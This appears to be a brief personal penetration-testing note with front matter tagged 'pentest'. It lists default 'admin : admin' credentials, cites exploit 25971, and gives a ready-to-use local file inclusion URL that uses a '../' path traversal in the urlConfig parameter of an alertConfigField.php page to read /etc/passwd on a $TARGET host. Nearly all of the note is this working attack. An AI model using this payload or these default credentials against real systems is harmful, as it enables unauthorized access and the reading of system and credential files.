---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
admin : admin

LFI:

exploit 25971

```
http://$TARGET/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
